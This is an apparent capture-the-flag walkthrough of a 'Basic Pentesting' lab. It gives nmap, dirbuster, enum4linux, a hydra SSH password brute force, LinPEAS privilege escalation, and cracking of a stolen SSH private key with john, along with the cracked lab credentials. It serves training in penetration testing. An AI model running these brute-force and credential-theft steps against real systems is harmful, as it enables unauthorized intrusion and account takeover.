# Basic Pentesting - Ping [IP Address]

IP: 10.10.78.58

# Scanning - Make 'nmap/[file-name]' folder -> nmap -sC -sV -oN nmap/initial [IP Address] -> check to see if any ports are 'open' -> open nmap scan w/ subl nmap/[file-name]

nmap -sC -sV -oN nmap/initial [IP Address]

Open Ports 
```
22
80
139
445
```

# Go to address in browser with IP or DOMAIN -> view source page ctrl u -> see what type of information is there
"in this example the html had a note stating '<!-- Check our dev note section if you need to know what to work on. -->' try different url with paths ie.[10.10.78.58/dev/]

# We would need a tool to brute force our way through possible hidden directories of the server like [dirbuster] (program that would find directories) 

Dir found: / - 200
Dir found: /icons/ - 403
Dir found: /development/ - 200
File found: /development/dev.txt - 200
File found: /development/j.txt - 200
Dir found: /icons/small/ - 403

# head to those urls and investigate the contents 
- in this lab we need to find the username and password next

# Use tool 'enum4linux' -> sudo /usr/share/enum4linux/ - a [IP Address] | tee enum4linux.log

# Let the script run and find the User\ 

S-1-22-1-1000 Unix User\kay (Local User)                                  
S-1-22-1-1001 Unix User\jan (Local User)

# Now we know the Username we can not brute force the password login using 'hydra'

hydra -l [username] -P /usr/share/wordlists/rockyou.txt ssh://[IP Address]

[22][ssh] host: 10.10.78.58   login: jan   password: armando

# SSH into the machine now, [ssh (user)@(IP Address)]

# Once connected you can do 'pwd' to see what working directory youre in. then 'ls -la' for hidden folders.If a bunch of files are access denied.

# LinPEAS to raise privellege escalation 
we can scp the .sh file over to the user with the command below:

scp /usr/share/linpeas/linpeas.sh jan@10.10.78.58:/dev/shm

# /dev/shm is a path that all users should have

chmod +x linpeas.sh -> Makes it executable

Run the .sh and | tee to a .txt file 

Look at the infomation and see if you can find any type of 'id_rsa' 

Port 22
PermitRootLogin prohibit-password
PubkeyAuthentication yes
PermitEmptyPasswords no
ChallengeResponseAuthentication no
UsePAM yes

══╣ Possible private SSH keys were found!
/home/kay/.ssh/id_rsa

# Head to that location and open the id_rsa folder
[cat id_rsa]
Take the information and nano into a new file

# Johntheripper -> /usr/share/john/ [name of the rsa file]

/usr/share/john/ssh2john.py kay_id_rsa > forjohn.txt

john forjohn.txt --wordlist=/usr/share/wordlists/rockyou.txt

'''
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
beeswax          (kay_id_rsa)     
1g 0:00:00:00 DONE (2025-04-25 17:54) 100.0g/s 8275Kp/s 8275Kc/s 8275KC/s behlat..bammer
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
'''

SSH back into the machine: 

ssh -i kay_id_rsa kay@10.10.78.58
Enter Password found with john

we should have permission to view all the files. 

drwxr-xr-x 5 kay  kay  4096 Apr 23  2018 .
drwxr-xr-x 4 root root 4096 Apr 19  2018 ..
-rw------- 1 kay  kay   756 Apr 23  2018 .bash_history
-rw-r--r-- 1 kay  kay   220 Apr 17  2018 .bash_logout
-rw-r--r-- 1 kay  kay  3771 Apr 17  2018 .bashrc
drwx------ 2 kay  kay  4096 Apr 17  2018 .cache
-rw------- 1 root kay   119 Apr 23  2018 .lesshst
drwxrwxr-x 2 kay  kay  4096 Apr 23  2018 .nano
-rw------- 1 kay  kay    57 Apr 23  2018 pass.bak
-rw-r--r-- 1 kay  kay   655 Apr 17  2018 .profile
drwxr-xr-x 2 kay  kay  4096 Apr 23  2018 .ssh
-rw-r--r-- 1 kay  kay     0 Apr 17  2018 .sudo_as_admin_successful
-rw------- 1 root kay   538 Apr 23  2018 .viminf

cat pass.bak
[heresareallystrongpasswordthatfollowsthepasswordpolicy$$]
